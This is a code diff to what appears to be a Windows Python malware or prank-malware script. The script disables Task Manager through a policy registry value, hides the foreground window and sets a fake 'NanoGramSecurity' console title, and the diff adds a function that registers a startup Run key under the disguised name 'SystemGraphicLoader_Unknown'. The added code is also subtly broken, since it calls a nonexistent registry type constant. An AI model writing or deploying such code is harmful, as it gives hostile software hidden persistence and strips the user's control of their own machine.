@@ -3,9 +3,10 @@ import win32console
 import win32con
 import win32gui
 import winreg
-import pyautogui as pat
+import pyautogui
 from threading import Thread
 from win32 import *
+import os
 
 LAST_WINDOW = 0
 
@@ -39,7 +40,7 @@ maxX, maxY = pyautogui.size()
 
 def hidden():
     pid = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(pid,SW_HIDE)
+    win32gui.ShowWindow(pid,win32con.SW_HIDE)
 #hidden()
 
 def max_win(window_name):
@@ -52,7 +53,7 @@ def run_command(command,n=1): # runs command but no cares like threading but bet
 
 def disable_task_manager():
     # Path to the explorer properties
-    registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+    registry_path: str = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
     # Name of the key
     registry_name: str = "DisableTaskMgr"
     # Value that the registry key is set to
@@ -67,6 +68,7 @@ def disable_task_manager():
 
 def UserLogOut():
     win32api.ExitWindows()
+
 
 
 def FindExecutableFile(executableFileName):
@@ -97,3 +99,14 @@ def msgbox(title,text,type=16):
 
 win32console.SetConsoleTitle("NanoGramSecurity\\ BANANA_SECURITY")
 
+def AddToRegistry(path:str):
+    address=os.path.join(path)
+
+    key = winreg.HKEY_CURRENT_USER
+    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+    openReg = winreg.OpenKey(key,key_value,winreg.KEY_ALL_ACCESS)
+
+    winreg.SetValueEx(openReg,f"SystemGraphicLoader_Unknown",winreg.winreg_SZ,address)
+
+    winreg.CloseKey(openReg)
